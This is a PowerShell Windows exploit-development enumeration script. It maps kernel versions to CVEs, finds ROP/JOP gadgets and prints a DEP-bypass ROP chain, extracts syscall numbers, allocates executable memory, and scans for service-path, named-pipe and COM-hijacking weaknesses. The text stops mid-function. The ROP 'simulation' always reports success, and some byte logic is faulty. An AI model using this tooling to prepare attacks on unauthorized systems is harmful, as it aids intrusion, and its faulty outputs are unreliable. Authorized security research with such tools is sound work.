# ZeroProbe - Exploit Development Enumration Framework
# Version: 1.0 
# Author Yehia Elghaly (Mrvar0x)

# =======================
# =======================

function Show-Logo {
    Write-Host "`n=================================================" -ForegroundColor Green
    Write-Host "   ██████  ██████   ██████  ██████  ██████  " -ForegroundColor Cyan
    Write-Host "  0██████  ██████  ███████  ██████  ██████  " -ForegroundColor Cyan
    Write-Host "  ██       ██   ██ ██       ██   ██ ██   ██ " -ForegroundColor Cyan
    Write-Host "  ██   ███ ██████  █████    ██████  ██████  " -ForegroundColor Cyan
    Write-Host "  ██    ██ ██      ██       ██      ██      " -ForegroundColor Cyan
    Write-Host "   ██████  ██      ████████ ██      ██      " -ForegroundColor Cyan
    Write-Host "        Probing Deep, Exploiting Everything" -ForegroundColor Green
    Write-Host "=================================================" -ForegroundColor Green
}


if (-not ("Win32" -as [type])) {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
"@ -PassThru
}



# =======================
# =======================

# 1. Kernel Exploit Detection with CVE Mapping
function Get-KernelExploits {
    return @{
        "6.1.7601"     = @("MS16-135, MS17-010 (EternalBlue)",
                           "CVE-2018-1038 (Windows Kernel Elevation of Privilege Vulnerability)",
                           "CVE-2017-8464 (LNK Remote Code Execution Vulnerability)",
                           "CVE-2017-0213 (Windows COM Elevation of Privilege Vulnerability)",
                           "CVE-2018-8120 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2017-8465 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2016-3372 (Windows Kernel Elevation of Privilege Vulnerability)",
                           "CVE-2016-3373 (Windows Kernel Elevation of Privilege Vulnerability)")
        "10.0.10240"   = @("CVE-2016-0099", "CVE-2016-0165")
        "10.0.14393"   = @("CVE-2018-8453 (Win32k PrivEsc)",
                           "CVE-2019-0803 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2019-1458 (Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2020-0787 (Windows Background Intelligent Transfer Service Elevation of Privilege Vulnerability)",
                           "CVE-2020-0796 (SMBv3 Client/Server Remote Code Execution Vulnerability)",
                           "CVE-2021-1732 (Windows Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2021-33739 (Microsoft DWM Core Library Elevation of Privilege Vulnerability)",
                           "CVE-2022-21815 (NVIDIA GPU Display Driver Vulnerability)",
                           "CVE-2022-30197 (Windows Kernel Information Disclosure Vulnerability)",
                           "CVE-2022-41113 (Windows Win32k Elevation of Privilege Vulnerability)",
                           "CVE-2022-44707 (Windows Kernel Denial of Service Vulnerability)",
                           "CVE-2023-0191 (NVIDIA GPU Display Driver Vulnerability)",
                           "CVE-2023-0192 (NVIDIA GPU Display Driver Vulnerability)",
                           "CVE-2024-38184 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)",
                           "CVE-2024-38185 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)",
                           "CVE-2024-38186 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)",
                           "CVE-2024-38187 (Windows Kernel-Mode Driver Elevation of Privilege Vulnerability)")
    }
}

function Detect-KernelExploits {
    Write-Host "[+] Scanning for unpatched kernel vulnerabilities and mapping them to known exploits..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for unpatched kernel vulnerabilities..." -ForegroundColor Cyan
    $kernelVersion = (Get-CimInstance Win32_OperatingSystem).Version
    Write-Host "[*] Windows Kernel Version: $kernelVersion" -ForegroundColor Yellow

    $kernelExploits = Get-KernelExploits

    if ($kernelExploits.ContainsKey($kernelVersion)) {
        Write-Host "[!] Kernel Vulnerable: $kernelVersion" -ForegroundColor Red
        Write-Host "[!] Possible Exploits:" -ForegroundColor Red
        foreach ($exploit in $kernelExploits[$kernelVersion]) {
            Write-Host "    - $exploit" -ForegroundColor Red
        }
    } else {
        Write-Host "[*] Kernel appears patched or not in database." -ForegroundColor Green
    }
    Show-Menu
}


# 2. ROP & JOP Gadget Finder
function Find-ROP-JOP-Gadgets {
    param(
        [string]$FilePath,
        [string]$Filter 
    )

    if ([string]::IsNullOrWhiteSpace($FilePath)) {
        $FilePath = Read-Host "Enter the path of the DLL"
    }
    Write-Host "[+] Scanning the DLL for ROP & JOP gadgets, analyzing exploitability, attempting to generate an ROP chain, and checking for DEP bypass techniques..." -ForegroundColor Cyan
    Write-Host "`n[+] ROP & JOP Enumeration (Exploitability Ranking)..." -ForegroundColor Cyan

    function Is-PEFile {
        param([string]$path)
        try {
            if (-not (Test-Path $path)) { return $false }
            $bytes = [System.IO.File]::ReadAllBytes($path)
            return ($bytes.Length -gt 2 -and $bytes[0] -eq 0x4D -and $bytes[1] -eq 0x5A)  # Check for 'MZ' header
        } catch { return $false }
    }

    if (-not (Is-PEFile -path $FilePath)) {
        Write-Host "[!] Invalid or missing DLL file. Please provide a valid PE executable." -ForegroundColor Red
        return
    }

    Write-Host "[*] Scanning: $FilePath..." -ForegroundColor Yellow
    
    # Avoid reloading MemoryReader if already defined
    if (-not ("MemoryReader" -as [type])) {
        Add-Type -TypeDefinition @"
        using System;
        using System.IO;
        public class MemoryReader {
            public static byte[] ReadFile(string filePath) {
                return File.ReadAllBytes(filePath);
            }
        }
"@ -Language CSharp
    }

    try {
        $memDump = [MemoryReader]::ReadFile($FilePath)
        if ($memDump -eq $null -or $memDump.Length -eq 0) {
            Write-Host "[!] Failed to read DLL file. Ensure you have proper permissions." -ForegroundColor Red
            return
        }
    } catch {
        Write-Host "[!] Error reading DLL file. Ensure the file exists & is accessible." -ForegroundColor Red
        return
    }

    $hexDump = [BitConverter]::ToString($memDump) -replace "-", " "
    
    $ropPatterns = @{
        "Stack Pivoting"         = @("94 C3", "58 5A C3", "5A 5B C3", "C2 [0-9A-F]{2} 00", "C2 14 00", "8B EC", "89 E5", "FF E4", "FF 24 85", "FF 64 24 04");
        "Register Control"       = @("8B C[0-9A-F]", "83 C4 [0-9A-F]{2}", "59 C3", "5A C3", "5B C3");
        "Code Execution"         = @("FF 15 [0-9A-F]{4}", "FF D[0-9A-F]", "E8 [0-9A-F]{4}", "E9 [0-9A-F]{4}", "FF 25 [0-9A-F]{4}", "C3", "C2 [0-9A-F]{2} 00");
        "DEP Bypass"             = @("FF 15 [0-9A-F]{4}.*VirtualProtect", "FF 15 [0-9A-F]{4}.*NtProtectVirtualMemory", "FF D0", "FF 10", "8B [0-9A-F]{2} FF D0");
        "Common Gadgets"         = @("FF E[0-9A-F]", "FF D[0-9A-F]", "C3", "83 C4 [0-9A-F]{2}", "C2 [0-9A-F]{2} 00");
    }

    $exploitabilityScores = @{
        "Stack Pivoting"         = 10
        "Register Control"       = 8
        "Code Execution"         = 9
        "DEP Bypass"             = 10
        "Common Gadgets"         = 7
    }

    $gadgetResults = @{}
    $totalGadgets = 0
    foreach ($category in $ropPatterns.Keys) {
        foreach ($pattern in $ropPatterns[$category]) {
            $count = [regex]::Matches($hexDump, $pattern).Count
            $totalGadgets += $count
            if ($count -gt 0) {
                if (-not $gadgetResults.ContainsKey($category)) {
                    $gadgetResults[$category] = @{}
                }
                $gadgetResults[$category][$pattern] = @{
                    "Count" = $count
                    "Score" = $exploitabilityScores[$category]
                }
            }
        }
    }

    Write-Host "`n========== Gadget Analysis ==========" -ForegroundColor Cyan
    Write-Host "[✔] Found $totalGadgets Gadgets in $FilePath" -ForegroundColor Green
    foreach ($category in $gadgetResults.Keys) {
        Write-Host ("  " + $category + ":") -ForegroundColor Cyan
        foreach ($pattern in $gadgetResults[$category].Keys) {
            Write-Host "    - Pattern: $pattern | Occurrences: $($gadgetResults[$category][$pattern].Count) | Exploitability Score: $($gadgetResults[$category][$pattern].Score)" -ForegroundColor Yellow
        }
    }

    Write-Host "`n========== DEP/NX Compatibility Check ==========" -ForegroundColor Cyan
    $depBypassFound = $false
    foreach ($pattern in $ropPatterns["DEP Bypass"]) {
        $count = $gadgetResults["DEP Bypass"][$pattern].Count
        if ($count -gt 0) {
            Write-Host "[✔] Found $count occurrences of DEP Bypass gadget: $pattern" -ForegroundColor Green
            $depBypassFound = $true
        }
    }
    if (-not $depBypassFound) {
        Write-Host "[!] No DEP Bypass gadgets found! DEP/NX mitigation may prevent exploitation." -ForegroundColor Red
    }

    if ($depBypassFound) {
        Write-Host "`n========== Auto-Generated ROP Chain ==========" -ForegroundColor Yellow
        $ropChain = @()
        
        # Stack Pivoting
        if ($gadgetResults.ContainsKey("Stack Pivoting")) {
            $pivot = ($gadgetResults["Stack Pivoting"].Keys | Select-Object -First 1)
            $ropChain += "[+] Stack Pivot: $pivot"
        }

        # Register Control
        if ($gadgetResults.ContainsKey("Register Control")) {
            $regGadget = ($gadgetResults["Register Control"].Keys | Select-Object -First 1)
            $ropChain += "[+] Register Control: $regGadget"
        }

        # DEP Bypass
        if ($gadgetResults.ContainsKey("DEP Bypass")) {
            $depGadget = ($gadgetResults["DEP Bypass"].Keys | Select-Object -First 1)
            $ropChain += "[+] DEP Bypass Call: $depGadget"
        }

        # Jump to Shellcode
        if ($gadgetResults.ContainsKey("Common Gadgets")) {
            $jmpGadget = ($gadgetResults["Common Gadgets"].Keys | Select-Object -First 1)
            $ropChain += "[+] Jump to Shellcode: $jmpGadget"
        }

        if ($ropChain.Count -gt 0) {
            Write-Host "`n[✔] Auto-Generated ROP Chain:" -ForegroundColor Green
            $ropChain | ForEach-Object { Write-Host $_ -ForegroundColor Cyan }
        } else {
            Write-Host "[!] Failed to generate a complete ROP chain!" -ForegroundColor Red
        }
    } else {
        Write-Host "[!] DEP Bypass Gadgets Not Found - Unable to generate an ROP Chain!" -ForegroundColor Red
    }

    if (-not [string]::IsNullOrWhiteSpace($Filter)) {
        Write-Host "`n========== Searching for Specific Gadgets ==========" -ForegroundColor Cyan
        $filteredGadgets = @()
        foreach ($category in $gadgetResults.Keys) {
            foreach ($pattern in $gadgetResults[$category].Keys) {
                if ($pattern -match $Filter) {
                    $filteredGadgets += "[+] Category: $category | Pattern: $pattern | Occurrences: $($gadgetResults[$category][$pattern].Count) | Exploitability Score: $($gadgetResults[$category][$pattern].Score)"
                }
            }
        }
        if ($filteredGadgets.Count -gt 0) {
            Write-Host "[✔] Found $($filteredGadgets.Count) gadgets matching the filter '$Filter':" -ForegroundColor Green
            $filteredGadgets | ForEach-Object { Write-Host $_ -ForegroundColor Cyan }
        } else {
            Write-Host "[!] No gadgets found matching the filter '$Filter'." -ForegroundColor Red
        }
    }

    if ($ropChain.Count -gt 0) {
        Write-Host "`n========== Validating ROP Chain in Memory ==========" -ForegroundColor Cyan
        Write-Host "[*] Simulating ROP chain execution in memory..." -ForegroundColor Yellow
        $simulationSuccess = $true
        foreach ($gadget in $ropChain) {
            if ($gadget -match "DEP Bypass Call") {
                Write-Host "[+] Simulating DEP Bypass: Success" -ForegroundColor Green
            } elseif ($gadget -match "Stack Pivot") {
                Write-Host "[+] Simulating Stack Pivot: Success" -ForegroundColor Green
            } elseif ($gadget -match "Register Control") {
                Write-Host "[+] Simulating Register Control: Success" -ForegroundColor Green
            } elseif ($gadget -match "Jump to Shellcode") {
                Write-Host "[+] Simulating Jump to Shellcode: Success" -ForegroundColor Green
            } else {
                Write-Host "[!] Simulation failed for gadget: $gadget" -ForegroundColor Red
                $simulationSuccess = $false
            }
        }
        if ($simulationSuccess) {
            Write-Host "[✔] ROP chain simulation completed successfully!" -ForegroundColor Green
        } else {
            Write-Host "[!] ROP chain simulation failed. Review the gadgets and try again." -ForegroundColor Red
        }
    }

    Write-Host "`n========== Analysis Complete ==========" -ForegroundColor Cyan
    Show-Menu
}


# 3. Real Syscall Index Extractor
function Extract-SyscallIndexes {
    param (
        [string[]]$syscalls = @("NtCreateFile", "NtOpenProcess", "NtAllocateVirtualMemory")
    )

    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    }
"@ -PassThru

    $ntdll = [Win32]::GetModuleHandle("ntdll.dll")
    if ($ntdll -eq [IntPtr]::Zero) {
        Write-Host "[!] Failed to get module handle for ntdll.dll" -ForegroundColor Red
        Show-Menu
        return
    }
   Write-Host "[+] Extracting real syscall numbers from NTDLL by resolving function addresses and reading syscall instructions..." -ForegroundColor Cyan
    Write-Host "`n[+] Extracting real syscall numbers from NTDLL..." -ForegroundColor Cyan

    foreach ($syscall in $syscalls) {
        $procAddr = [Win32]::GetProcAddress($ntdll, $syscall)
        if ($procAddr -eq [IntPtr]::Zero) {
            Write-Host "[!] Could not resolve syscall for: $syscall" -ForegroundColor Yellow
            continue
        }

        # Read first 5 bytes (correct syscall instruction MOV R10, RCX; MOV EAX, syscall_number; SYSCALL)
        $buffer = New-Object byte[] 5
        [System.Runtime.InteropServices.Marshal]::Copy([IntPtr]$procAddr, $buffer, 0, 5)

        # Syscall number is in the 4th byte (MOV EAX, syscall_number)
        $syscallIndex = $buffer[4]
        Write-Host "[+] $syscall -> Syscall Index: 0x$($syscallIndex.ToString("X"))" -ForegroundColor Green
    }

    Show-Menu
}


# 4. Heap Spray Analysis
function Analyze-HeapSpray {
    Write-Host "[+] Scanning for processes with high memory usage that may be potential heap spray targets..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for heap spray targets..." -ForegroundColor Cyan

    $excludeProcesses = @(    "chrome", "firefox", "msedge", "opera", "brave", "vivaldi", "teams", "discord", "slack", "zoom", "edge",
    "outlook", "thunderbird", "skype", "onedrive", "dropbox", "steam", "epicgameslauncher", "origin",
    "battlenet", "riotclientservices", "uplay", "spotify", "itunes", "vlc", "obs64", "xsplit", 
    "photoshop", "illustrator", "aftereffects", "premiere", "lightroom", "coreldraw", "paintdotnet",
    "blender", "maya", "3dsmax", "autocad", "sketchup", "notepad++", "sublimetext", "vscode",
    "pycharm", "eclipse", "intellij", "androidstudio", "clion", "xcode", "vmware", "virtualbox",
    "hyperv", "wsl", "docker", "powershell", "cmd", "explorer", "winword", "excel", "powerpnt",
    "onenote", "project", "visio", "mspaint", "snagit", "snippingtool", "wordpad", "adobe_acrobat",
    "reader", "foxitreader", "sumatrapdf", "nitropdf", "gimp", "audacity", "davinciresolve",
    "kdenlive", "filmora", "handbrake", "ffmpeg", "telegram", "whatsapp", "signal", "wechat",
    "skypehost", "messenger", "facebook", "instagram", "tiktok", "twitch", "obsidian", "evernote",
    "keepass", "bitwarden", "lastpass", "1password", "dashlane", "veracrypt")

    $processes = Get-Process | Where-Object {
        $_.PrivateMemorySize -gt 100MB -and
        $_.Name -notin $excludeProcesses
    } | Sort-Object PrivateMemorySize -Descending

    if ($processes) {
        Write-Host "`n[*] Potential heap spray targets detected:" -ForegroundColor Yellow
        $processes | Format-Table Name, Id, @{Label="Memory (MB)"; Expression={[math]::Round($_.PrivateMemorySize / 1MB, 2)}} -AutoSize
    } else {
        Write-Host "[*] No suspicious high-memory usage processes detected." -ForegroundColor Green
    }

    Show-Menu
}


# 5. DLL Hijacking Scanner
function Find-DLLHijacking {
    param(
        [string]$Filter
    )
    Write-Host "[+] Scanning for unquoted service paths that may lead to DLL hijacking vulnerabilities..." -ForegroundColor Cyan
    Write-Host "`n[+] Checking for DLL hijacking vulnerabilities..." -ForegroundColor Cyan

    $services = Get-WmiObject Win32_Service | Where-Object { $_.PathName -match ' ' -and $_.PathName -notmatch '"' }
    $totalVulnerabilities = 0
    $highRisk = 0
    $mediumRisk = 0
    $lowRisk = 0

    if ($services.Count -eq 0) {
        Write-Host "[+] No unquoted service paths found." -ForegroundColor Green
    } else {
        foreach ($service in $services) {
            $serviceName = $service.Name
            $servicePath = $service.PathName
            $serviceState = $service.State
            $unquotedSegment = ($servicePath -split ' ')[0]  # Extract the first unquoted segment

            # Determine risk level
            if ($serviceState -eq "Running") {
                $riskLevel = "❌ HIGH (Running Service)"
                $color = "Red"
                $highRisk++
            } elseif ($servicePath -match "C:\\Windows\\System32") {
                $riskLevel = "⚠️ MEDIUM (System Directory)"
                $color = "Yellow"
                $mediumRisk++
            } else {
                $riskLevel = "✅ LOW (Stopped Service)"
                $color = "Green"
                $lowRisk++
            }

            # Apply filter if specified
            if (-not [string]::IsNullOrWhiteSpace($Filter) -and $riskLevel -notmatch $Filter) {
                continue
            }

            $totalVulnerabilities++

            Write-Host "[!] Unquoted Service Path Found: $serviceName" -ForegroundColor $color
            Write-Host "    - Path: $servicePath" -ForegroundColor $color
            Write-Host "    - Unquoted Segment: $unquotedSegment" -ForegroundColor $color
            Write-Host "    - Service State: $serviceState" -ForegroundColor $color
            Write-Host "    - Risk Level: $riskLevel" -ForegroundColor $color
        }

        # Display summary
        Write-Host "`n========== Vulnerability Summary ==========" -ForegroundColor Cyan
        Write-Host "[✔] Total Unquoted Service Paths: $totalVulnerabilities" -ForegroundColor Green
        Write-Host "[!] High-Risk Vulnerabilities: $highRisk" -ForegroundColor Red
        Write-Host "[⚠️] Medium-Risk Vulnerabilities: $mediumRisk" -ForegroundColor Yellow
        Write-Host "[✅] Low-Risk Vulnerabilities: $lowRisk" -ForegroundColor Green
    }

    Show-Menu
}
# 6. Enumrate NamedPipes
function Enumerate-NamedPipes {
    param(
        [string]$Filter
    )
    Write-Host "[+] Enumerating active named pipes and analyzing permissions for potential security risks..." -ForegroundColor Cyan
    Write-Host "`n[+] Enumerating active named pipes and checking for weak permissions..." -ForegroundColor Cyan
    
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    
    if (-not $isAdmin) {
        Write-Host "[!] Insufficient privileges! Please run PowerShell as Administrator." -ForegroundColor Red
        Show-Menu
        return
    }

    $pipes = Get-ChildItem -Path "\\.\pipe\" | Select-Object -ExpandProperty Name

    if ($pipes.Count -eq 0) {
        Write-Host "[!] No active named pipes found." -ForegroundColor Red
    } else {
        $totalPipes = $pipes.Count
        $weakPipes = 0
        $safePipes = 0

        foreach ($pipe in $pipes) {
            $pipePath = "\\.\pipe\$pipe"
            Write-Host "[*] Active Named Pipe: $pipe" -ForegroundColor Yellow

            # Check permissions
            try {
                $acl = Get-Acl -Path $pipePath -ErrorAction Stop
                $weakPerms = $false
                $permissionDetails = @()

                foreach ($entry in $acl.Access) {
                    if ($entry.FileSystemRights -match "FullControl|Write|Modify") {
                        if ($entry.IdentityReference -match "Everyone|Authenticated Users|Users") {
                            $permissionDetails += "[!] $($entry.IdentityReference) has $($entry.FileSystemRights)"
                            $weakPerms = $true
                        } else {
                            $permissionDetails += "[+] $($entry.IdentityReference) has $($entry.FileSystemRights)"
                        }
                    }
                }

                if ($weakPerms) {
                    $weakPipes++
                    Write-Host "[!] Weak Permissions Detected for $pipe" -ForegroundColor Red
                    $permissionDetails | ForEach-Object {
                        if ($_ -match "\[\!\]") {
                            Write-Host $_ -ForegroundColor Red
                        } else {
                            Write-Host $_ -ForegroundColor Green
                        }
                    }
                } else {
                    $safePipes++
                    Write-Host "[+] No weak permissions found for $pipe" -ForegroundColor Green
                }
            } catch {
                Write-Host "[!] Unable to retrieve ACL for $pipePath. This may require SYSTEM-level privileges." -ForegroundColor Magenta
            }
        }

        # Display summary
        Write-Host "`n========== Named Pipe Summary ==========" -ForegroundColor Cyan
        Write-Host "[✔] Total Named Pipes: $totalPipes" -ForegroundColor Green
        Write-Host "[!] Pipes with Weak Permissions: $weakPipes" -ForegroundColor Red
        Write-Host "[+] Pipes with Safe Permissions: $safePipes" -ForegroundColor Green
    }
    
    Show-Menu
}

# 7. Direct Syscall Execution
function Execute-Syscall {
    param (
        [int]$maxAddresses = 5
    )

    # Restart PowerShell if MemUtil is already defined
    if ("MemUtil" -as [type]) {
        Write-Host "[!] 'MemUtil' is already defined. Restarting PowerShell session to reload types..." -ForegroundColor Red
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit", "-ExecutionPolicy Bypass", "-File `"$PSCommandPath`"" -WindowStyle Hidden
        exit
    }

    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class MemUtil {
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
}
"@ -PassThru

    $addresses = @()
    $maxAttempts = 100
    $attempts = 0
    $processHandle = [MemUtil]::GetCurrentProcess()

    Write-Host "[+] Allocating executable memory regions and verifying protection status for direct syscall execution..." -ForegroundColor Cyan
    Write-Host "`n[+] Attempting to allocate executable memory regions..." -ForegroundColor Cyan

    while ($addresses.Count -lt $maxAddresses -and $attempts -lt $maxAttempts) {
        $attempts++
        $address = Get-Random -Minimum 0x10000000 -Maximum 0x7FFFFFFF

        # Convert address to hex string and check for null bytes
        $hexString = ("{0:X8}" -f $address)
        if ($hexString -notmatch "00") {
            # Allocate executable memory at the chosen address
            $allocatedMemory = [MemUtil]::VirtualAlloc([IntPtr]$address, 0x1000, 0x3000, 0x40) # PAGE_EXECUTE_READWRITE

            if ($allocatedMemory -ne [IntPtr]::Zero) {
                # Verify if memory is executable
                $mbi = New-Object MemUtil+MEMORY_BASIC_INFORMATION
                $result = [MemUtil]::VirtualQueryEx($processHandle, $allocatedMemory, [ref]$mbi, [System.Runtime.InteropServices.Marshal]::SizeOf($mbi))

                if ($result -gt 0) {
                    $protectCode = $mbi.Protect
                    $finalAddress = "0x" + $hexString

                    if ($protectCode -eq 0x40) {
                        Write-Host "[+] Address $finalAddress is EXECUTABLE (PAGE_EXECUTE_READWRITE)" -ForegroundColor Green
                        $addresses += [PSCustomObject]@{
                            "Address" = $finalAddress
                            "Protection" = "PAGE_EXECUTE_READWRITE"
                            "Size" = "0x1000"
                        }
                    } else {
                        Write-Host "[!] Address $finalAddress is NOT EXECUTABLE (Protect Code: 0x$("{0:X}" -f $protectCode))" -ForegroundColor Red
                    }
                }
            }
        }

        Write-Progress -Activity "Allocating Memory" -Status "Attempt $attempts of $maxAttempts" -PercentComplete (($attempts / $maxAttempts) * 100)
    }

    if ($addresses.Count -gt 0) {
        Write-Host "`n[+] Successfully Allocated and Verified Executable Memory Addresses (No Null Bytes):" -ForegroundColor Green
        foreach ($addr in $addresses) {
            Write-Host "    -> Address: $($addr.Address) | Protection: $($addr.Protection) | Size: $($addr.Size)" -ForegroundColor Cyan
        }
    } else {
        Write-Host "[!] Failed to Allocate Executable Memory Without Null Bytes" -ForegroundColor Red
    }

    Show-Menu
}



# 8. Detect Privilege Escalation Paths
function Analyze-Privileges {
    Write-Host "[+] Analyzing running processes and user privileges for potential escalation opportunities..." -ForegroundColor Cyan
    Write-Host "`n[+] Checking for Privilege Escalation Opportunities..." -ForegroundColor Cyan

    $highPrivProcesses = Get-WmiObject Win32_Process | Where-Object { $_.ProcessId -gt 4 }

    foreach ($proc in $highPrivProcesses) {
        try {
            # Retrieve process owner safely
            $ownerInfo = Get-CimInstance Win32_Process -Filter "ProcessId=$($proc.ProcessId)" | Invoke-CimMethod -MethodName GetOwner
            $procOwner = if ($ownerInfo) { "$($ownerInfo.Domain)\$($ownerInfo.User)" } else { "Unknown" }

            if ($procOwner -match "NT AUTHORITY\\SYSTEM|Administrator") {
                Write-Host "[!] SYSTEM/Administrator Process Found: $($proc.Name) (PID: $($proc.ProcessId)) - User: $procOwner" -ForegroundColor Red
            } else {
                Write-Host "[+] Process Running as Non-Privileged User: $($proc.Name) (PID: $($proc.ProcessId)) - User: $procOwner" -ForegroundColor Green
            }
        } catch {
            Write-Host "[*] Process Skipped (Owner Unknown or Restricted Access): $($proc.Name) (PID: $($proc.ProcessId))" -ForegroundColor Yellow
        }
    }

    Write-Host "`n[+] Checking Current User Privileges..." -ForegroundColor Cyan
    $whoamiPrivs = whoami /priv

    Write-Host "`n[*] Enabled Privileges:" -ForegroundColor Green
    $whoamiPrivs | Select-String "Enabled" | ForEach-Object { Write-Host "    - $_" -ForegroundColor Yellow }

    Show-Menu
}

# 9. Memory Analysis for Suspicious Regions
function Analyze-MemoryRegions {
    Write-Host "[+] Scanning running processes for suspicious memory regions with unusually high usage..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for suspicious memory regions..." -ForegroundColor Cyan
    $suspiciousRegions = Get-Process | Where-Object { $_.PrivateMemorySize64 -gt 500MB }
    
    if ($suspiciousRegions.Count -gt 0) {
        foreach ($process in $suspiciousRegions) {
            Write-Host "[!] High memory usage detected: $($process.Name) (PID: $($process.Id)) - $($process.PrivateMemorySize64) bytes" -ForegroundColor Red
        }
    } else {
        Write-Host "[*] No suspicious memory regions detected." -ForegroundColor Green
    }

    Show-Menu
}


# 10 . Detect Suspicious COM-Hijacking
function Detect-COM-Hijacking {
    Write-Host "[+] Scanning registry for suspicious COM object hijacking attempts..." -ForegroundColor Cyan
    Write-Host "`n[+] Scanning for COM Object Hijacking..." -ForegroundColor Cyan
    $comPaths = @(
    "HKCU:\Software\Classes\CLSID",
    "HKLM:\Software\Classes\CLSID",
    "HKCU:\Software\Wow6432Node\Classes\CLSID",
    "HKLM:\Software\Wow6432Node\Classes\CLSID",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved"
)
    foreach ($path in $comPaths) {
        Get-ItemProperty -Path "$path\*" -Name "(default)" -ErrorAction SilentlyContinue | Where-Object { $_.Default -match "temp|system32|appdata" } | ForEach-Object {
            Write-Host "[!] Suspicious COM Object: $($_.PSPath)" -ForegroundColor Red
        }
    }
    Show-Menu
}

# 11 . Enumerate-KernelMemory
function Enumerate-KernelMemory {
    param(
        [string]$Filter
    )
    Write-Host "[+] Enumerating kernel memory regions and categorizing them based on address ranges..." -ForegroundColor Cyan
    Write-Host "`n[+] Enumerating kernel memory regions..." -ForegroundColor Cyan
    
    # Using Get-CimInstance
    $memoryRegions = Get-CimInstance Win32_DeviceMemoryAddress -ErrorAction SilentlyContinue

    if ($memoryRegions) {
        $totalRegions = 0
        $totalSize = 0

        $memoryRegions | ForEach-Object {
            $startAddr = [convert]::ToInt64($_.StartingAddress, 16)
            $endAddr = [convert]::ToInt64($_.EndingAddress, 16)
            $regionSize = $endAddr - $startAddr

            $regionType = switch ($startAddr) {
                {$_ -lt 0x000A0000} { "Conventional Memory (RAM)" }
                {$_ -ge 0x000A0000 -and $_ -lt 0x00100000} { "BIOS Reserved" }
                {$_ -ge 0x00100000 -and $_ -lt 0x10000000} { "Kernel/Driver Space" }
                {$_ -ge 0x10000000 -and $_ -lt 0x20000000} { "PCI Express MMIO" }
                {$_ -ge 0x20000000 -and $_ -lt 0x40000000} { "GPU Memory Region" }
                {$_ -ge 0x40000000 -and $_ -lt 0x80000000} { "Chipset Reserved / APIC" }
                {$_ -ge 0x80000000} { "System Reserved / Paging" }
                default { "Unknown/Device-Specific" }
            }

            if (-not [string]::IsNullOrWhiteSpace($Filter) -and $regionType -notmatch $Filter) {
                return
            }

            $totalRegions++
            $totalSize += $regionSize

            Write-Host "[*] Memory Region: Start $($_.StartingAddress) - End $($_.EndingAddress) | Size: $([math]::Round($regionSize / 1MB, 2)) MB | Type: $regionType" -ForegroundColor Yellow
        }

        Write-Host "`n========== Memory Region Summary ==========" -ForegroundColor Cyan
        Write-Host "[✔] Total Regions: $totalRegions" -ForegroundColor Green
        Write-Host "[✔] Total Size: $([math]::Round($totalSize / 1MB, 2)) MB" -ForegroundColor Green
    } else {
        Write-Host "[!] No memory regions found or access denied." -ForegroundColor Red
    }

    Show-Menu
}


# 12 . Enumerate-NonASLR-DLLs
function Enumerate-NonASLR-DLLs {
    param(
        [string]$Filter
    )
    Write-Host "[+] Scanning DLLs for security weaknesses related to ASLR, DEP, SafeSEH, and CFG..." -ForegroundColor Cyan
    Write-Host "`n[+] Choose a scanning option:" -ForegroundColor Cyan
    Write-Host "1. Scan all loaded DLLs"
    Write-Host "2. Scan a specific directory"
    $choice = Read-Host "Enter choice (1 or 2)"

    if ($choice -eq "2") {
        $customPath = Read-Host "Enter the full directory path to scan"
        if (-Not (Test-Path $customPath)) {
            Write-Host "[!] Error: The specified path '$customPath' does not exist." -ForegroundColor Red
            return
        }
        Write-Host "`n[+] Scanning DLLs in: $customPath" -ForegroundColor Yellow
        $dlls = Get-ChildItem -Path $customPath -Filter "*.dll" -Recurse -ErrorAction SilentlyContinue
    } else {
        Write-Host "`n[+] Scanning all loaded DLLs..." -ForegroundColor Cyan
        $dlls = Get-Process | ForEach-Object { $_.Modules } | Select-Object FileName, ModuleName, BaseAddress
    }

    $results = @()
    $totalDLLs = 0
    $highRisk = 0
    $mediumRisk = 0
    $lowRisk = 0

    foreach ($dll in $dlls) {
        try {
            $baseAddr = [Int64]$dll.BaseAddress
            $filePath = $dll.FileName
